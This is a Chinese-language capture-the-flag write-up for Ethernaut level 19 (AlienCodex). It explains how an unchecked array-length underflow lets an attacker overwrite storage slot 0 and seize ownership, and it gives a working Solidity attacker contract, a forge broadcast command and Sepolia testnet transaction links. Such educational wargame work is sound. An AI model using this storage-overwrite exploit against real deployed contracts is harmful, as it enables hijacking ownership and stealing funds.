# Level 19

[The Ethernaut level 19](https://ethernaut.openzeppelin.com/level/19)

这一关的目的是成为的 `AlienCodex` 合约的 owner。

仔细阅读合约，`AlienCodex` 合约并没有提供更改 `owner` 相关的函数。但是继承了 `Ownable` 合约，该合约有一个 `address private _owner` 状态变量。`AlienCodex` 合约表面上只提供了修改 `codex` 动态数组的功能。但是，该 solidity 是 ^5.0.0，没有提供溢出保护。因此，可以从这里入手，通过计算指定存储槽的值，修改 `codex` 数组的值，进而覆盖 `owner` 变量所在槽的值。

合约存储布局如下：

x = keccak256(1)
| slot | value |
| ---- | ---- |
|slot(0)     | owner(20) contact(1)  |
|slot(1)     | codex 的长度  |
|...         | ...  |
|...         | ...  |
|slot(x)     | codex[0]  |
|slot(x+1)   | codex[1]  |
|...         | ...  |
|slot(0)   | codex[0-x] |


攻击者合约：
```
contract Attacker {
    IAlienCodex level;

    constructor(address level_) {
        level = IAlienCodex(level_);
    }

    function attack() public {
        level.makeContact();

        level.retract();

        uint256 slotCodex =  uint(keccak256(abi.encode(1)));
        uint256 slotTarget;
        unchecked {
            slotTarget = 0 - slotCodex;
        }

        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        level.revise(slotTarget, myAddress);
    }
}
```

执行脚本：
```
forge script script/level19.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

完整代码见：[这里](../../ethernaut/script/Level19.s.sol)

链上记录：
- [level(`AlienCodex`)](https://sepolia.etherscan.io/address/0x76fC80CEDE65348d96FD4e03d0f0e2Feb46Dfd66)
- [Attacker](https://sepolia.etherscan.io/tx/0x66B10B1ADEF6Ef9d145928C1BA497E99e94B5ba2)
- [attack 交易](https://sepolia.etherscan.io/tx/0xc5558634733c89877e78c9d947245faafa014864d17d50e14a72c9409e20a154)